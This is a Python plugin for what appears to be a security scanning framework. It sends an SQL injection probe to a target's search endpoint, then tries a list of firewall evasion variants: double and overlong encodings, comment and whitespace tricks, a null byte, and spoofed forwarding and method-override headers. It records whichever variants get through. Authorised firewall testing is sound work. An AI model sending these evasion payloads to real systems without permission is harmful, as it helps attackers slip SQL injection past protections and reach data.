"""WAF bypass analyzer — discovers encoding/evasion techniques that pass through WAF."""

from __future__ import annotations

from typing import ClassVar
from urllib.parse import quote

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

# Baseline payload that any WAF should block
BLOCKED_PAYLOAD = "' OR 1=1--"

# Bypass techniques: (name, transform_fn_description, transformed_payload, extra_headers)
BYPASS_TECHNIQUES: list[tuple[str, str, dict[str, str]]] = [
    (
        "double_encode",
        "%2527%20OR%201%253D1--",
        {},
    ),
    (
        "unicode_normalize",
        "%C0%A7%20OR%201=1--",
        {},
    ),
    (
        "case_alternation",
        "' oR 1=1--",
        {},
    ),
    (
        "comment_insertion",
        "' O/**/R 1=1--",
        {},
    ),
    (
        "inline_comment",
        "'/*!OR*/ 1=1--",
        {},
    ),
    (
        "null_byte",
        "%00' OR 1=1--",
        {},
    ),
    (
        "newline_injection",
        "' OR%0a1=1--",
        {},
    ),
    (
        "tab_injection",
        "' OR%091=1--",
        {},
    ),
    (
        "xff_localhost",
        BLOCKED_PAYLOAD,
        {"X-Forwarded-For": "127.0.0.1"},
    ),
    (
        "x_originating_ip",
        BLOCKED_PAYLOAD,
        {"X-Originating-IP": "127.0.0.1"},
    ),
    (
        "x_original_url",
        BLOCKED_PAYLOAD,
        {"X-Original-URL": "/admin"},
    ),
    (
        "x_http_method_override_put",
        BLOCKED_PAYLOAD,
        {"X-HTTP-Method-Override": "PUT"},
    ),
    (
        "content_type_json",
        '{"q": "\' OR 1=1--"}',
        {"Content-Type": "application/json"},
    ),
]


class WafBypassPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="waf_bypass",
        display_name="WAF Bypass Analyzer",
        category=PluginCategory.ANALYSIS,
        description="Tests WAF evasion techniques and records working bypasses",
        depends_on=["waf_detect"],
        produces=["waf_bypass_techniques"],
        timeout=45.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        # Check if WAF was detected
        waf_key = f"waf_detect:{target.host}"
        waf_result = ctx.pipeline.get(waf_key)

        if not waf_result or not waf_result.ok:
            return PluginResult.skipped(
                self.meta.name, target.host, reason="waf_detect not available"
            )

        waf_list = waf_result.data.get("waf", [])
        if not waf_list:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("No WAF detected, bypass not needed")],
                data={"bypass_techniques": [], "waf_type": None},
            )

        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available"
            )

        waf_type = waf_list[0] if waf_list else "unknown"
        findings: list[Finding] = []
        working_bypasses: list[str] = []

        # Get baseline: send the blocked payload, expect WAF block (403/406/429)
        base_url = ""
        for scheme in ("https", "http"):
            try:
                async with ctx.rate:
                    await ctx.http.head(f"{scheme}://{target.host}/", timeout=5.0)
                    base_url = f"{scheme}://{target.host}"
                    break
            except Exception:
                continue

        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable for WAF bypass testing")],
                data={"bypass_techniques": [], "waf_type": waf_type},
            )

        # Send baseline blocked payload
        blocked_status = await self._send_payload(
            ctx, base_url, quote(BLOCKED_PAYLOAD), {},
        )

        # If baseline isn't blocked, WAF may not filter this path
        if blocked_status and blocked_status < 400:
            findings.append(Finding.info(
                f"WAF ({waf_type}) did not block baseline payload on /",
                tags=["analysis", "waf"],
            ))
            return PluginResult.success(
                self.meta.name, target.host,
                findings=findings,
                data={"bypass_techniques": [], "waf_type": waf_type},
            )

        # Test each bypass technique
        for technique_name, payload, headers in BYPASS_TECHNIQUES:
            if ctx.should_stop:
                break

            status = await self._send_payload(ctx, base_url, payload, headers)
            if status is None:
                continue

            # A bypass is detected if the WAF lets it through (200-399)
            if status < 400:
                working_bypasses.append(technique_name)
                findings.append(Finding.high(
                    f"WAF bypass: {technique_name} passes through {waf_type}",
                    description=(
                        f"Technique '{technique_name}' returned HTTP {status} "
                        f"while baseline was blocked (HTTP {blocked_status})"
                    ),
                    evidence=f"Payload: {payload[:80]}, Headers: {headers or 'none'}",
                    remediation="Update WAF rules to cover encoding/evasion techniques",
                    tags=["analysis", "waf", "bypass"],
                ))

        if not findings:
            findings.append(Finding.info(
                f"No WAF bypass techniques found for {waf_type}",
                tags=["analysis", "waf"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={
                "bypass_techniques": working_bypasses,
                "waf_type": waf_type,
                "techniques_tested": len(BYPASS_TECHNIQUES),
            },
        )

    @staticmethod
    async def _send_payload(
        ctx, base_url: str, payload: str, extra_headers: dict[str, str],
    ) -> int | None:
        """Send payload to target, return HTTP status or None on error."""
        url = f"{base_url}/search?q={payload}"
        try:
            async with ctx.rate:
                resp = await ctx.http.get(
                    url, headers=extra_headers or None, timeout=8.0,
                )
                return resp.status
        except Exception:
            return None
